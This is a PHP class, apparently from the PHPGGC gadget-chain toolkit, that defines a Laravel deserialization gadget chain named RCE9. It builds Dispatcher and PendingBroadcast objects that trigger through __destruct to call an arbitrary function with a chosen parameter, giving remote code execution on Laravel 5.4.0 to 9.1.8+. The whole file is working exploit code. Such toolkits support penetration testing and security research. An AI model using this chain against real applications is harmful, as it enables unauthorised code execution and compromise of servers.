<?php

namespace GadgetChain\Laravel;

class RCE9 extends \PHPGGC\GadgetChain\RCE\FunctionCall
{
    public static $version = '5.4.0 <= 9.1.8+';
    public static $vector = '__destruct';
    public static $author = '1nhann';


    public function generate(array $parameters)
    {
        $function = $parameters['function'];
        $param = $parameters['parameter'];

        $dispatcher = new \Illuminate\Bus\Dispatcher($function);
        $pendingBroadcast = new \Illuminate\Broadcasting\PendingBroadcast($dispatcher,$param);
        return $pendingBroadcast;
    }
}
